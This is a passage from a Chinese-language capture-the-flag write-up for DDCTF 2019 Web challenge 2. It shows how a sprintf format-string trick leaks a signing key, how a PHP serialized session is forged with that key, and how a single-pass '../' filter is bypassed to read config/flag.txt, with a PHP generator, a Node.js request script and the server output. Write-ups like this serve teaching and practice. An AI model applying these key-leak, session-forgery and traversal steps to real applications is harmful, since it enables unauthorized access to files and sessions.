{"errMsg":"success","data":"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"}{"errMsg":"Welcome","data":"Welcome my friend EzblrbNS"}{"errMsg":"sucess","data":"DiDI Welcome you got\/9.6.0 (https:\/\/github.com\/sindresorhus\/got)"}
```

在第二条 JSON 中便获得了 key 的值：`EzblrbNS`。

这是因为 #12 中问题语句的执行过程变成了：

```php
// （伪代码）
$data = "Welcome my friend %s";
// <- "Welcome my friend %s"
$data = sprintf($data, $_POST["nickname"]);
// -> sprintf("Welcome my friend %s", "%s")
// <- "Welcome my friend %s"
$data = sprintf($data, $this->eancrykey);
// -> sprintf("Welcome my friend %s", "EzblrbNS")
// <- "Welcome my friend EzblrbNS"
```

获得了 key，意味着可以构造任意内容的 session（根据 #9 的规则）。

接下来利用 [#11 的反序列化触发 #3 的解构方法执行](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14)，并借此为 `$this->path` 赋值。

这里快速地写一个 PHP，帮助生成序列化的 session:

```php
<?php
  $key = 'EzblrbNS';

  class Application {
    var $path = "TODO";
  }
  $instance = new Application();
  $payload = serialize($instance);
  $session = $payload.md5($key.$payload);
  echo $session;
?>
```

那么 `path` 应该是什么呢？

根据 #8 的注释，暂猜测目标文件是 `../config/flag.txt`，长度刚好就是 18，但还需要先通过 sanitize。

回到 #4，可以发现 sanitize 函数对 `'../'` 的过滤操作仅仅只做了一次。于是构造出字符串 `....//config/flag.txt`，使 sanitize 后的值恰好为 `../config/flag.txt`。

修改刚才的 PHP 脚本：
```diff
-    var $path = "TODO";
+    var $path = "....//config/flag.txt";
```

[执行](https://eval.in/private/3e61187556e78f) 后获得序列化的 session：`O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525`，写入 cookie 后再次向 Session.php 发起请求：

```javascript
const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

;(async () => {
  const SESSION = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
  const client = createClient()
  const response = await client.post('http://117.51.158.44/app/Session.php', {
    headers: {
      cookie: `ddctf_id=${encodeURIComponent(SESSION)};`,
    },
  })
  console.log(response.body)
})()
```

观察 Node.js 打印的日志：

```json
{"errMsg":"success","data":"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"}{"errMsg":"Congratulations","data":"DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}"}
```

获得 flag `DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}`，顺利拿下第二关 :v:。

### 涉及资料
- 源代码
  - [获取 key](./web/2/step2.js)
  - [生成序列化 session](./web/2/serialize.php)
  - [获取 flag](./web/2/step2.js)
  - [完整通关脚本](./web/2/step2.js)
- 知识点
  - [PHP 反序列化触发命令执行](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14)
  - ~~[登入界面中，「登录」和「登陆」哪个正确？](https://www.zhihu.com/question/19570377)~~
  - ~~[encrypt 是什么意思](http://dict.cn/encrypt)~~


## 0x03. Web 3 - Upload-IMG
### 题目
> Upload-IMG  
> 
> http://117.51.148.166/upload.php  
> user：dd@ctf  
> pass：DD@ctf#000  

### 解题过程
TODO
